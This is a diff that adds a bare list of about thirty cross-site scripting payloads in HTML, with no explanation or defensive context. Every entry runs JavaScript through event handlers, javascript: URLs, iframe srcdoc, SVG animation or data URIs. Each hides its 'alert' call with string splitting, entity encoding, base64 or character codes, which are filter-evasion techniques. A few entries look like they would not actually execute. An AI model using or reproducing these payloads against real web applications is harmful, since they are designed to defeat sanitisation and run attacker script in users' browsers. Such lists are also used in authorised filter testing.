@@ -1,0 +1,32 @@
+```html
+<img src=x onerror=(function(){window['al'+'ert']('XSS')})()>
+<svg onload='(window["al"+"ert"](1))'>
+<meta http-equiv="refresh" content="0;url=javascript:(window['al'+'ert'](1))">
+<iframe srcdoc="<script>al&#101;rt(1)</script>"></iframe>
+<object data="javascript:al&#101;rt(1)"></object>
+<marquee onstart='(function(){window["al"+"ert"](1)})()'></marquee>
+<video><source onerror='(function(){window["al"+"ert"]("1")})()'></video>
+<details open ontoggle=(function(){window['al'+'ert'](1)})()></details>
+<svg><animate attributeName="onload" begin="0" dur="1s" fill="freeze" values="window['al'+'ert'](&#x31;)"></animate></svg>
+<svg onload="setTimeout(function(){window['al'+'ert'](1)},0)"></svg>
+<iframe srcdoc="<img src=x onerror=window['al'+'ert']('XSS')>"></iframe>
+<img src=x onerror="setTimeout(function(){al&#101;rt('XSS')},0)">
+<svg><desc><![CDATA[window['al'+'ert'](1)]]></desc></svg>
+<object data="javascript:&#97;&#108;&#101;&#114;&#116;(1)"></object>
+<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"></iframe>
+<details open ontoggle='setTimeout(function(){window["al"+"ert"](1)},0)'></details>
+<svg><set attributeName="onload" to="window['al'+'ert'](1)"></set></svg>
+<img src=x onerror='(function(){window["al"+"ert"]("XSS")})()'>
+<svg onload="window.setTimeout('al'+'ert(1)',0)"></svg>
+<iframe srcdoc='<svg onload=window["al"+"ert"]("XSS")></svg>'></iframe>
+<object type="image/svg+xml" data="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9J2FsZXJ0KDEpJz48L3N2Zz4="></object>
+<details open ontoggle='(window.Function(atob("YWxlcnQoMSk=")))()'></details>
+<iframe srcdoc="<svg onload='window[String.fromCharCode(97,108,101,114,116)](1)'></svg>"></iframe>
+<object data="javascript:window['al'+'ert'](1)"></object>
+<svg onload="window['al'+'ert'](String.fromCharCode(49))"></svg>
+<img src=x onerror="window['set'+'Timeout']('al'+'ert(1)',0)">
+<marquee onstart="window['al'+'ert']('XSS')"></marquee>
+<svg><set attributeName="onload" to="window['al'+'ert']('XSS')"></set></svg>
+<iframe srcdoc="<object data='javascript:al%65rt(1)'></object>"></iframe>
+<video><source onerror="window['al'+'ert'](1)"></video>
+```
